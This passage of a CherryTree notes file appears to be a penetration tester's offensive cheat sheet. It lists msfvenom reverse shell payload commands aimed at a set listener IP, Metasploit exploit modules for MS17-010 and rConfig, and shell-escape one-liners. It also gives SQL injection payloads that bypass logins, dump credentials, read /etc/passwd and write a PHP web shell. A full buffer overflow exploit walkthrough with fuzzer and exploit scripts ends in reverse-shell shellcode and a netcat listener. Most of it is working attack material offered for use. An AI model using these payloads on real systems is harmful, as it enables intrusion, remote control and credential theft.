      <rich_text family="monospace" background="#000000000000">msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f macho &gt; nameoffile.macho</rich_text>
      <rich_text background="#000000000000">

MSFvenom command used to generate a MacOS-based reverse shell payload

</rich_text>
      <rich_text family="monospace" background="#000000000000">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.113 LPORT=443 -f asp &gt; nameoffile.asp</rich_text>
      <rich_text background="#000000000000">

MSFvenom command used to generate a ASP web reverse shell payload

</rich_text>
      <rich_text family="monospace" background="#000000000000">msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f raw &gt; nameoffile.jsp</rich_text>
      <rich_text background="#000000000000">

MSFvenom command used to generate a JSP web reverse shell payload

</rich_text>
      <rich_text family="monospace" background="#000000000000">msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f war &gt; nameoffile.war</rich_text>
      <rich_text background="#000000000000">

MSFvenom command used to generate a WAR java/jsp compatible web reverse shell payload

</rich_text>
      <rich_text family="monospace" background="#000000000000">use auxiliary/scanner/smb/smb_ms17_010</rich_text>
      <rich_text background="#000000000000">

Metasploit exploit module used to check if a host is vulnerable to </rich_text>
      <rich_text family="monospace" background="#000000000000">ms17_010</rich_text>
      <rich_text background="#000000000000">

</rich_text>
      <rich_text family="monospace" background="#000000000000">use exploit/windows/smb/ms17_010_psexec</rich_text>
      <rich_text background="#000000000000">

Metasploit exploit module used to gain a reverse shell session on a Windows-based system that is vulnerable to ms17</rich_text>
      <rich_text style="italic" background="#000000000000">010</rich_text>
      <rich_text background="#000000000000">
</rich_text>
      <rich_text family="monospace" background="#000000000000">use exploit/linux/http/rconfig_vendors_auth_file_upload_rce</rich_text>
      <rich_text background="#000000000000">

Metasploit exploit module that can be used to optain a reverse shell on a vulnerable linux system hosting </rich_text>
      <rich_text family="monospace" background="#000000000000">rConfig 3.9.6</rich_text>
      <rich_text background="#000000000000">

</rich_text>
      <rich_text family="monospace" background="#000000000000">python -c 'import pty; pty.spawn("/bin/sh")'</rich_text>
      <rich_text background="#000000000000">

Python command used to spawn an </rich_text>
      <rich_text family="monospace" background="#000000000000">interactive shell</rich_text>
      <rich_text background="#000000000000"> on a linux-based system

</rich_text>
      <rich_text family="monospace" background="#000000000000">/bin/sh -i</rich_text>
      <rich_text background="#000000000000">

Spawns an interactive shell on a linux-based system

</rich_text>
      <rich_text family="monospace" background="#000000000000">perl —e 'exec "/bin/sh";'</rich_text>
      <rich_text background="#000000000000">

Uses </rich_text>
      <rich_text family="monospace" background="#000000000000">perl</rich_text>
      <rich_text background="#000000000000"> to spawn an interactive shell on a linux-based system

</rich_text>
      <rich_text family="monospace" background="#000000000000">ruby: exec "/bin/sh"</rich_text>
      <rich_text background="#000000000000">

Uses </rich_text>
      <rich_text family="monospace" background="#000000000000">ruby</rich_text>
      <rich_text background="#000000000000"> to spawn an interactive shell on a linux-based system

</rich_text>
      <rich_text family="monospace" background="#000000000000">Lua: os.execute('/bin/sh')</rich_text>
      <rich_text background="#000000000000">

Uses </rich_text>
      <rich_text family="monospace" background="#000000000000">Lua</rich_text>
      <rich_text background="#000000000000"> to spawn an interactive shell on a linux-based system

</rich_text>
      <rich_text family="monospace" background="#000000000000">awk 'BEGIN {system("/bin/sh")}'</rich_text>
      <rich_text background="#000000000000">

Uses </rich_text>
      <rich_text family="monospace" background="#000000000000">awk</rich_text>
      <rich_text background="#000000000000"> command to spawn an interactive shell on a linux-based system

</rich_text>
      <rich_text family="monospace" background="#000000000000">find / -name nameoffile 'exec /bin/awk 'BEGIN {system("/bin/sh")}' ;</rich_text>
      <rich_text background="#000000000000">

Uses </rich_text>
      <rich_text family="monospace" background="#000000000000">find</rich_text>
      <rich_text background="#000000000000"> command to spawn an interactive shell on a linux-based system

</rich_text>
      <rich_text family="monospace" background="#000000000000">find . -exec /bin/sh ; -quit</rich_text>
      <rich_text background="#000000000000">

An alternative way to use the </rich_text>
      <rich_text family="monospace" background="#000000000000">find</rich_text>
      <rich_text background="#000000000000"> command to spawn an interactive shell on a linux-based system

</rich_text>
      <rich_text family="monospace" background="#000000000000">vim -c ':!/bin/sh'</rich_text>
      <rich_text background="#000000000000">

Uses the text-editor </rich_text>
      <rich_text family="monospace" background="#000000000000">VIM</rich_text>
      <rich_text background="#000000000000"> to spawn an interactive shell. Can be used to escape "jail-shells"

</rich_text>
      <rich_text family="monospace" background="#000000000000">ls -la &lt;path/to/fileorbinary&gt;</rich_text>
      <rich_text background="#000000000000">

Used to </rich_text>
      <rich_text family="monospace" background="#000000000000">list</rich_text>
      <rich_text background="#000000000000"> files &amp; directories on a linux-based system and shows the permission for each file in the chosen directory. Can be used to look for binaries that we have permission to execute

</rich_text>
      <rich_text family="monospace" background="#000000000000">sudo -l</rich_text>
      <rich_text background="#000000000000">

Displays the commands that the currently logged on user can run as </rich_text>
      <rich_text family="monospace" background="#000000000000">sudo</rich_text>
      <rich_text background="#000000000000">

</rich_text>
      <rich_text family="monospace" background="#000000000000">/usr/share/webshells/laudanum</rich_text>
      <rich_text background="#000000000000">

Location of </rich_text>
      <rich_text family="monospace" background="#000000000000">laudanum webshells</rich_text>
      <rich_text background="#000000000000"> on ParrotOS and Pwnbox

</rich_text>
      <rich_text family="monospace" background="#000000000000">/usr/share/nishang/Antak-WebShell</rich_text>
      <rich_text background="#000000000000">

Location of </rich_text>
      <rich_text family="monospace" background="#000000000000">Antak-Webshell</rich_text>
      <rich_text background="#000000000000"> on Parrot OS and Pwnbox</rich_text>
    </node>
  </node>
  <node unique_id="107" master_id="0" name="SQL Injection" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="44" is_bold="1" foreground="#3584e4" ts_creation="1670980821" ts_lastsave="1670984128">
    <node unique_id="109" master_id="0" name="SQL Injections" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670980856" ts_lastsave="1670980864">
      <rich_text background="#000000000000">
</rich_text>
      <rich_text scale="h2" background="#000000000000">MySQL
</rich_text>
      <rich_text background="#000000000000">
</rich_text>
      <rich_text background="#000000000000" weight="heavy">General</rich_text>
      <rich_text background="#000000000000">

</rich_text>
      <rich_text family="monospace" background="#000000000000">mysql -u root -h docker.eu -P 3306 -p</rich_text>
      <rich_text background="#000000000000">

login to mysql database

</rich_text>
      <rich_text family="monospace" background="#000000000000">SHOW DATABASES</rich_text>
      <rich_text background="#000000000000">

List available databases

</rich_text>
      <rich_text family="monospace" background="#000000000000">USE users</rich_text>
      <rich_text background="#000000000000">

Switch to database

</rich_text>
      <rich_text background="#000000000000" weight="heavy">Tables</rich_text>
      <rich_text background="#000000000000">

</rich_text>
      <rich_text family="monospace" background="#000000000000">CREATE TABLE logins (id INT, ...)</rich_text>
      <rich_text background="#000000000000">

Add a new table

</rich_text>
      <rich_text family="monospace" background="#000000000000">SHOW TABLES</rich_text>
      <rich_text background="#000000000000">

List available tables in current database

</rich_text>
      <rich_text family="monospace" background="#000000000000">DESCRIBE logins</rich_text>
      <rich_text background="#000000000000">

Show table properties and columns

</rich_text>
      <rich_text family="monospace" background="#000000000000">INSERT INTO table_name VALUES (value_1,..)</rich_text>
      <rich_text background="#000000000000">

Add values to table

</rich_text>
      <rich_text family="monospace" background="#000000000000">INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)</rich_text>
      <rich_text background="#000000000000">

Add values to specific columns in a table

</rich_text>
      <rich_text family="monospace" background="#000000000000">UPDATE table_name SET column1=newvalue1, ... WHERE &lt;condition&gt;</rich_text>
      <rich_text background="#000000000000">

Update table values

</rich_text>
      <rich_text background="#000000000000" weight="heavy">Columns</rich_text>
      <rich_text background="#000000000000">

</rich_text>
      <rich_text family="monospace" background="#000000000000">SELECT * FROM table_name</rich_text>
      <rich_text background="#000000000000">

Show all columns in a table

</rich_text>
      <rich_text family="monospace" background="#000000000000">SELECT column1, column2 FROM table_name</rich_text>
      <rich_text background="#000000000000">

Show specific columns in a table

</rich_text>
      <rich_text family="monospace" background="#000000000000">DROP TABLE logins</rich_text>
      <rich_text background="#000000000000">

Delete a table

</rich_text>
      <rich_text family="monospace" background="#000000000000">ALTER TABLE logins ADD newColumn INT</rich_text>
      <rich_text background="#000000000000">

Add new column

</rich_text>
      <rich_text family="monospace" background="#000000000000">ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn</rich_text>
      <rich_text background="#000000000000">

Rename column

</rich_text>
      <rich_text family="monospace" background="#000000000000">ALTER TABLE logins MODIFY oldColumn DATE</rich_text>
      <rich_text background="#000000000000">

Change column datatype

</rich_text>
      <rich_text family="monospace" background="#000000000000">ALTER TABLE logins DROP oldColumn</rich_text>
      <rich_text background="#000000000000">

Delete column

</rich_text>
      <rich_text background="#000000000000" weight="heavy">Output</rich_text>
      <rich_text background="#000000000000">

</rich_text>
      <rich_text family="monospace" background="#000000000000">SELECT * FROM logins ORDER BY column_1</rich_text>
      <rich_text background="#000000000000">

Sort by column

</rich_text>
      <rich_text family="monospace" background="#000000000000">SELECT * FROM logins ORDER BY column_1 DESC</rich_text>
      <rich_text background="#000000000000">

Sort by column in descending order

</rich_text>
      <rich_text family="monospace" background="#000000000000">SELECT * FROM logins ORDER BY column_1 DESC, id ASC</rich_text>
      <rich_text background="#000000000000">

Sort by two
</rich_text>
      <rich_text family="monospace" background="#000000000000">SELECT * FROM logins LIMIT 2</rich_text>
      <rich_text background="#000000000000">

Only show first two results

</rich_text>
      <rich_text family="monospace" background="#000000000000">SELECT * FROM logins LIMIT 1, 2</rich_text>
      <rich_text background="#000000000000">

Only show first two results starting from index 2

</rich_text>
      <rich_text family="monospace" background="#000000000000">SELECT * FROM table_name WHERE &lt;condition&gt;</rich_text>
      <rich_text background="#000000000000">

List results that meet a condition

</rich_text>
      <rich_text family="monospace" background="#000000000000">SELECT * FROM logins WHERE username LIKE 'admin%'</rich_text>
      <rich_text background="#000000000000">

List results where the name is similar to a given string

</rich_text>
      <rich_text scale="h2" background="#000000000000">MySQL Operator Precedence
</rich_text>
      <rich_text background="#000000000000">
•   Division (</rich_text>
      <rich_text family="monospace" background="#000000000000">/)</rich_text>
      <rich_text background="#000000000000"> Multiplication (</rich_text>
      <rich_text family="monospace" background="#000000000000">*)</rich_text>
      <rich_text background="#000000000000"> and Modulus (</rich_text>
      <rich_text family="monospace" background="#000000000000">%)
</rich_text>
      <rich_text background="#000000000000">•   Addition (</rich_text>
      <rich_text family="monospace" background="#000000000000">+)</rich_text>
      <rich_text background="#000000000000"> Subtraction (</rich_text>
      <rich_text family="monospace" background="#000000000000">-)
</rich_text>
      <rich_text background="#000000000000">•   Comparison (</rich_text>
      <rich_text family="monospace" background="#000000000000">=</rich_text>
      <rich_text background="#000000000000">, </rich_text>
      <rich_text family="monospace" background="#000000000000">&gt;</rich_text>
      <rich_text background="#000000000000">, </rich_text>
      <rich_text family="monospace" background="#000000000000">&lt;</rich_text>
      <rich_text background="#000000000000">, </rich_text>
      <rich_text family="monospace" background="#000000000000">&lt;=</rich_text>
      <rich_text background="#000000000000">, </rich_text>
      <rich_text family="monospace" background="#000000000000">&gt;=</rich_text>
      <rich_text background="#000000000000">, </rich_text>
      <rich_text family="monospace" background="#000000000000">!=</rich_text>
      <rich_text background="#000000000000">, </rich_text>
      <rich_text family="monospace" background="#000000000000">LIKE)
</rich_text>
      <rich_text background="#000000000000">•   NOT (</rich_text>
      <rich_text family="monospace" background="#000000000000">!)
</rich_text>
      <rich_text background="#000000000000">•   AND (</rich_text>
      <rich_text family="monospace" background="#000000000000">&amp;&amp;)
</rich_text>
      <rich_text background="#000000000000">•   OR (</rich_text>
      <rich_text family="monospace" background="#000000000000">||)
</rich_text>
      <rich_text background="#000000000000">
</rich_text>
      <rich_text scale="h2" background="#000000000000">SQL Injection
</rich_text>
      <rich_text background="#000000000000">
</rich_text>
      <rich_text background="#000000000000" weight="heavy">Payload</rich_text>
      <rich_text background="#000000000000">

</rich_text>
      <rich_text background="#000000000000" weight="heavy">Description</rich_text>
      <rich_text background="#000000000000">

</rich_text>
      <rich_text background="#000000000000" weight="heavy">Auth Bypass</rich_text>
      <rich_text background="#000000000000">

</rich_text>
      <rich_text family="monospace" background="#000000000000">admin' or '1'='1</rich_text>
      <rich_text background="#000000000000">

Basic Auth Bypass

</rich_text>
      <rich_text family="monospace" background="#000000000000">admin')-- -</rich_text>
      <rich_text background="#000000000000">

Basic Auth Bypass With comments

</rich_text>
      <rich_text link="webs https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass" background="#000000000000">Auth Bypass Payloads</rich_text>
      <rich_text background="#000000000000">

</rich_text>
      <rich_text background="#000000000000" weight="heavy">Union Injection</rich_text>
      <rich_text background="#000000000000">

</rich_text>
      <rich_text family="monospace" background="#000000000000">' order by 1-- -</rich_text>
      <rich_text background="#000000000000">

Detect number of columns using </rich_text>
      <rich_text family="monospace" background="#000000000000">order by</rich_text>
      <rich_text background="#000000000000">

</rich_text>
      <rich_text family="monospace" background="#000000000000">cn' UNION select 1,2,3-- -</rich_text>
      <rich_text background="#000000000000">

Detect number of columns using Union injection

</rich_text>
      <rich_text family="monospace" background="#000000000000">cn' UNION select 1,@@version,3,4-- -</rich_text>
      <rich_text background="#000000000000">

Basic Union injection

</rich_text>
      <rich_text family="monospace" background="#000000000000">UNION select username, 2, 3, 4 from passwords-- -</rich_text>
      <rich_text background="#000000000000">

Union injection for 4 columns

</rich_text>
      <rich_text background="#000000000000" weight="heavy">DB Enumeration</rich_text>
      <rich_text background="#000000000000">

</rich_text>
      <rich_text family="monospace" background="#000000000000">SELECT @@version</rich_text>
      <rich_text background="#000000000000">

Fingerprint MySQL with query output

</rich_text>
      <rich_text family="monospace" background="#000000000000">SELECT SLEEP(5)</rich_text>
      <rich_text background="#000000000000">

Fingerprint MySQL with no output

</rich_text>
      <rich_text family="monospace" background="#000000000000">cn' UNION select 1,database(),2,3-- -</rich_text>
      <rich_text background="#000000000000">

Current database name

</rich_text>
      <rich_text family="monospace" background="#000000000000">cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -</rich_text>
      <rich_text background="#000000000000">

List all databases

</rich_text>
      <rich_text family="monospace" background="#000000000000">cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -</rich_text>
      <rich_text background="#000000000000">

List all tables in a specific database

</rich_text>
      <rich_text family="monospace" background="#000000000000">cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -</rich_text>
      <rich_text background="#000000000000">

List all columns in a specific table

</rich_text>
      <rich_text family="monospace" background="#000000000000">cn' UNION select 1, username, password, 4 from dev.credentials-- -</rich_text>
      <rich_text background="#000000000000">

Dump data from a table in another database

</rich_text>
      <rich_text background="#000000000000" weight="heavy">Privileges</rich_text>
      <rich_text background="#000000000000">

</rich_text>
      <rich_text family="monospace" background="#000000000000">cn' UNION SELECT 1, user(), 3, 4-- -</rich_text>
      <rich_text background="#000000000000">

Find current user

</rich_text>
      <rich_text family="monospace" background="#000000000000">cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -</rich_text>
      <rich_text background="#000000000000">

Find if user has admin privileges

</rich_text>
      <rich_text family="monospace" background="#000000000000">cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user="root"-- -</rich_text>
      <rich_text background="#000000000000">

Find if all user privileges

</rich_text>
      <rich_text family="monospace" background="#000000000000">cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -</rich_text>
      <rich_text background="#000000000000">

Find which directories can be accessed through MySQL

</rich_text>
      <rich_text background="#000000000000" weight="heavy">File Injection</rich_text>
      <rich_text background="#000000000000">

</rich_text>
      <rich_text family="monospace" background="#000000000000">cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -</rich_text>
      <rich_text background="#000000000000">

Read local file

</rich_text>
      <rich_text family="monospace" background="#000000000000">select 'file written successfully!' into outfile '/var/www/html/proof.txt'</rich_text>
      <rich_text background="#000000000000">

Write a string to a local file

</rich_text>
      <rich_text family="monospace" background="#000000000000">cn' union select "",'&lt;?php system($_REQUEST[0]); ?&gt;', "", "" into outfile '/var/www/html/shell.php'-- -</rich_text>
      <rich_text background="#000000000000">

Write a web shell into the base web directory</rich_text>
    </node>
  </node>
  <node unique_id="143" master_id="0" name="Buffer overflow" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="44" is_bold="1" foreground="#3584e4" ts_creation="1670981761" ts_lastsave="1670984140">
    <node unique_id="144" master_id="0" name="BoF" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670981793" ts_lastsave="1670982459">
      <rich_text background="#000000000000">
</rich_text>
      <rich_text scale="h2" background="#000000000000">Tools</rich_text>
      <rich_text background="#000000000000">

</rich_text>
      <rich_text scale="h3" background="#000000000000">Immunity Debugger</rich_text>
      <rich_text background="#000000000000">
</rich_text>
      <rich_text family="monospace" background="#000000000000">https://debugger.immunityinc.com/
</rich_text>
      <rich_text background="#000000000000">


</rich_text>
      <rich_text scale="h3" background="#000000000000">Mona</rich_text>
      <rich_text background="#000000000000">
</rich_text>
      <rich_text family="monospace" background="#000000000000">https://github.com/corelan/mona
</rich_text>
      <rich_text background="#000000000000">


</rich_text>
      <rich_text scale="h4" background="#000000000000">Mona installation</rich_text>
      <rich_text background="#000000000000">
</rich_text>
      <rich_text family="monospace" background="#000000000000">Drop mona.py into the 'PyCommands' folder (C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands\)
Install Python 2.7.14 or higher
</rich_text>
      <rich_text background="#000000000000">


</rich_text>
      <rich_text scale="h2" background="#000000000000">Buffer OverFlow</rich_text>
      <rich_text background="#000000000000">
Launch Immunity Debugger, then “Open” or “Attach” the .exe file.

</rich_text>
      <rich_text scale="h3" background="#000000000000">Mona configuration</rich_text>
      <rich_text background="#000000000000">
All mona commands must be run in the </rich_text>
      <rich_text background="#000000000000" weight="heavy">terminal</rich_text>
      <rich_text background="#000000000000"> inside Immunity Debugger (in the red rectangle).
</rich_text>
      <rich_text>
</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>   

</rich_text>
      <rich_text background="#000000000000">
Set the current working directory :
</rich_text>
      <rich_text family="monospace" background="#000000000000">!mona config -set workingfolder c:\mona\%p
</rich_text>
      <rich_text background="#000000000000">


=-=-=-=-=-=-=-==-=-=-=-=-=-=-==-=-=-=-=-=-=-==-=-=-=-=-=-=-==-=-=-=-=-=-=-=

</rich_text>
      <rich_text scale="h3" background="#000000000000">Fuzzing</rich_text>
      <rich_text background="#000000000000">:
Use fuzzer.py or fuzzer2.py, until the application crash inside Immunity Debugger.
</rich_text>
      <rich_text family="monospace" background="#000000000000"># fuzzer.py

import socket, time, sys

IP = "&lt;IP&gt;"
PORT = &lt;PORT&gt;
timeout = 5

buffer = []
counter = 100
while len(buffer) &lt; 30:
    buffer.append("A" * counter)
    counter += 100

for string in buffer:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((IP, PORT))
        s.recv(1024)
        print("Fuzzing with %s bytes" % len(string))
        s.send(string)
        s.recv(1024)
        s.close()
    except:
        print("Could not connect to " + IP + ":" + str(PORT))
        sys.exit(0)
    time.sleep(1)
</rich_text>
      <rich_text background="#000000000000">

=-=-=-=-=-=-=-==-=-=-=-=-=-=-==-=-=-=-=-=-=-==-=-=-=-=-=-=-==-=-=-=-=-=-=-=


</rich_text>
      <rich_text family="monospace" background="#000000000000"># fuzzer2.py

import socket

IP = "&lt;IP&gt;"
PORT = &lt;PORT&gt;

payload = 1000 * "A"

try: 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP,PORT))
    s.send(payload)
    print "[+] " + str(len(payload)) + " Bytes Sent"
except:
    print "[-] Crashed"
</rich_text>
      <rich_text background="#000000000000">

=-=-=-=-=-=-=-==-=-=-=-=-=-=-==-=-=-=-=-=-=-==-=-=-=-=-=-=-==-=-=-=-=-=-=-=

 modify those two variables of the scripts above :
  • IP
  • PORT

When the application crashes, EIP should be equal to </rich_text>
      <rich_text background="#000000000000" weight="heavy">41414141</rich_text>
      <rich_text background="#000000000000"> (hex value of “AAAA”).










=-=-=-=-=-=-=-==-=-=-=-=-=-=-==-=-=-=-=-=-=-==-=-=-=-=-=-=-==-=-=-=-=-=-=-=

</rich_text>
      <rich_text scale="h3" background="#000000000000">Crash replication &amp; controlling EIP</rich_text>
      <rich_text background="#000000000000">:

</rich_text>
      <rich_text scale="h4" background="#000000000000">Pattern</rich_text>
      <rich_text background="#000000000000">
Generate a cyclic pattern to found the exact offset of the crash :

</rich_text>
      <rich_text family="monospace" background="#000000000000"># Mona
!mona pc &lt;SIZE&gt;

# Metasploit
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l &lt;SIZE&gt;
</rich_text>
      <rich_text background="#000000000000">

The size must be </rich_text>
      <rich_text background="#000000000000" weight="heavy">higher</rich_text>
      <rich_text background="#000000000000"> than the crash offset. Now modify the </rich_text>
      <rich_text background="#000000000000" weight="heavy">payload</rich_text>
      <rich_text background="#000000000000"> variable by the cyclic pattern :


=-=-=-=-=-=-=-==-=-=-=-=-=-=-==-=-=-=-=-=-=-==-=-=-=-=-=-=-==-=-=-=-=-=-=-=

</rich_text>
      <rich_text family="monospace" background="#000000000000"># exploit.py

import socket

ip = "&lt;IP&gt;"
port = &lt;PORT&gt;

prefix = ""
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")
</rich_text>
      <rich_text background="#000000000000">



Re-run the exploit, the application should crash. To find the exact offset of the crash use :

</rich_text>
      <rich_text family="monospace" background="#000000000000">!mona findmsp -distance &lt;SIZE&gt;


Size is the </rich_text>
      <rich_text family="monospace" background="#000000000000" weight="heavy">same</rich_text>
      <rich_text family="monospace" background="#000000000000"> as the one used to create the pattern. The result should be something like :
EIP contains normal pattern : ... (offset XXXX)


Get the offset, modify in exploit.py:
  • The </rich_text>
      <rich_text family="monospace" background="#000000000000" weight="heavy">offset</rich_text>
      <rich_text family="monospace" background="#000000000000"> variable by the offset
  • The </rich_text>
      <rich_text family="monospace" background="#000000000000" weight="heavy">retn</rich_text>
      <rich_text family="monospace" background="#000000000000"> variable by “BBBB”
  • Remove the </rich_text>
      <rich_text family="monospace" background="#000000000000" weight="heavy">payload</rich_text>
      <rich_text family="monospace" background="#000000000000"> variable

offset = &lt;OFFSET&gt;
overflow = "A" * offset
retn = "BBBB"
payload = ""


Re-run exploit.py, EIP should be equal to </rich_text>
      <rich_text family="monospace" background="#000000000000" weight="heavy">42424242</rich_text>
      <rich_text family="monospace" background="#000000000000"> (hex value of “BBBB”). You now control EIP !



</rich_text>
      <rich_text background="#000000000000">

=-=-=-=-=-=-=-==-=-=-=-=-=-=-==-=-=-=-=-=-=-==-=-=-=-=-=-=-==-=-=-=-=-=-=-=





</rich_text>
      <rich_text scale="h3" background="#000000000000">Finding bad characters</rich_text>
      <rich_text background="#000000000000">:


Certain byte characters can cause issues in the development of  exploits. We must run every byte through the program to see if any  characters cause issues. By default, the null byte (</rich_text>
      <rich_text background="#000000000000" weight="heavy">\x00</rich_text>
      <rich_text background="#000000000000">) is always considered a bad character as it will truncate shellcode when executed.
We will send bad characters recursively and analyze if they need to  be removed. Let generate the list of bad characters with mona :

</rich_text>
      <rich_text family="monospace" background="#000000000000">!mona bytearray -b "\x00"
</rich_text>
      <rich_text background="#000000000000">

Copy the results in the variable </rich_text>
      <rich_text background="#000000000000" weight="heavy">payload</rich_text>
      <rich_text background="#000000000000">. And re-run exploit.py, the application should crash. Now to found those bad characters use this command :

</rich_text>
      <rich_text family="monospace" background="#000000000000">!mona compare -f C:\mona\&lt;PATH&gt;\bytearray.bin -a &lt;ESP_ADDRESS&gt;
</rich_text>
      <rich_text background="#000000000000">

If </rich_text>
      <rich_text background="#000000000000" weight="heavy">BadChars</rich_text>
      <rich_text background="#000000000000"> are found, we need to exclude them as well.

</rich_text>
      <rich_text family="monospace" background="#000000000000">!mona bytearray -b "\x00 + &lt;BAD_CHARS&gt;"

# Example
!mona bytearray -b "\x00\x01\x02\x03"
</rich_text>
      <rich_text background="#000000000000">

Then compare again :

</rich_text>
      <rich_text family="monospace" background="#000000000000">!mona compare -f C:\mona\&lt;PATH&gt;\bytearray.bin -a &lt;ESP_ADDRESS&gt;
</rich_text>
      <rich_text background="#000000000000">

Repeat those two steps until the results status returns </rich_text>
      <rich_text background="#000000000000" weight="heavy">Unmodified</rich_text>
      <rich_text background="#000000000000">, this indicates that no more bad characters exist.






=-=-=-=-=-=-=-==-=-=-=-=-=-=-==-=-=-=-=-=-=-==-=-=-=-=-=-=-==-=-=-=-=-=-=-=





</rich_text>
      <rich_text scale="h3" background="#000000000000">Finding a jump point</rich_text>
      <rich_text background="#000000000000">:

</rich_text>
      <rich_text scale="h4" background="#000000000000">JMP ESP - Inside the .exe</rich_text>
      <rich_text background="#000000000000">
</rich_text>
      <rich_text family="monospace" background="#000000000000">!mona jmp -r esp -cpb "&lt;BAD_CHARS&gt;"
</rich_text>
      <rich_text background="#000000000000">


</rich_text>
      <rich_text scale="h4" background="#000000000000">JMP ESP - inside a DLL</rich_text>
      <rich_text background="#000000000000">
</rich_text>
      <rich_text family="monospace" background="#000000000000">!mona modules
</rich_text>
      <rich_text background="#000000000000">

We need to found a .dll were Rebase, SafeSEH, ASLR, NXCompat are sets  to False. When you found it, run the command below to search for a </rich_text>
      <rich_text background="#000000000000" weight="heavy">JMP ESP</rich_text>
      <rich_text background="#000000000000"> (FFE4), inside the dll :
</rich_text>
      <rich_text family="monospace" background="#000000000000">!mona find -s "\xff\xe4" -m &lt;DLL&gt;
</rich_text>
      <rich_text background="#000000000000">


</rich_text>
      <rich_text scale="h4" background="#000000000000">Return address</rich_text>
      <rich_text background="#000000000000">
Choose an address in the results and update exploit.py :
  • Setting the </rich_text>
      <rich_text background="#000000000000" weight="heavy">retn</rich_text>
      <rich_text background="#000000000000"> variable to the address, written backwards (little-endian)

</rich_text>
      <rich_text family="monospace" background="#000000000000"># Example of a JMP ESP address
0x625011af

# exploit.py
retn = "\xaf\x11\x50\x62"







</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ffffffffffff">=-=-=-=-=-=-=-==-=-=-=-=-=-=-==-=-=-=-=-=-=-==-=-=-=-=-=-=-==-=-=-=-=-=-=-=</rich_text>
      <rich_text family="monospace" background="#000000000000">





</rich_text>
      <rich_text family="monospace" scale="h3" background="#000000000000" foreground="#ffffffffffff">Generate payload</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ffffffffffff">:</rich_text>
      <rich_text family="monospace" background="#000000000000">


</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ffffffffffff">Now we generate our shellcode </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ffffffffffff" weight="heavy">without</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ffffffffffff"> the badchars that we found :</rich_text>
      <rich_text family="monospace" background="#000000000000">

msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -b "&lt;BAD_CHARS&gt;" -f c


</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ffffffffffff">Copy the generated shellcode and update exploit.py :</rich_text>
      <rich_text family="monospace" background="#000000000000">


  • Setting the </rich_text>
      <rich_text family="monospace" background="#000000000000" weight="heavy">payload</rich_text>
      <rich_text family="monospace" background="#000000000000"> variable equal to the shellcode





</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ffffffffffff">=-=-=-=-=-=-=-==-=-=-=-=-=-=-==-=-=-=-=-=-=-==-=-=-=-=-=-=-==-=-=-=-=-=-=-=</rich_text>
      <rich_text family="monospace" background="#000000000000">




</rich_text>
      <rich_text family="monospace" scale="h3" background="#000000000000" foreground="#ffffffffffff">Prepend NOPs</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ffffffffffff">:</rich_text>
      <rich_text family="monospace" background="#000000000000">


</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ffffffffffff">A NOP-sled is a technique for exploiting stack buffer overflows. It  solves the problem of finding the exact address of the buffer by  effectively increasing the size of the target area, </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ffffffffffff" weight="heavy">\x90</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ffffffffffff"> represents a NOP in assembly. This instruction will literally do nothing and continue on with code execution.</rich_text>
      <rich_text family="monospace" background="#000000000000">


padding = "\x90" * 16



</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ffffffffffff">=-=-=-=-=-=-=-==-=-=-=-=-=-=-==-=-=-=-=-=-=-==-=-=-=-=-=-=-==-=-=-=-=-=-=-=</rich_text>
      <rich_text family="monospace" background="#000000000000">



</rich_text>
      <rich_text family="monospace" scale="h3" background="#000000000000" foreground="#ffffffffffff">Start a listener</rich_text>
      <rich_text family="monospace" background="#000000000000">

nc -lvp &lt;PORT&gt;










</rich_text>
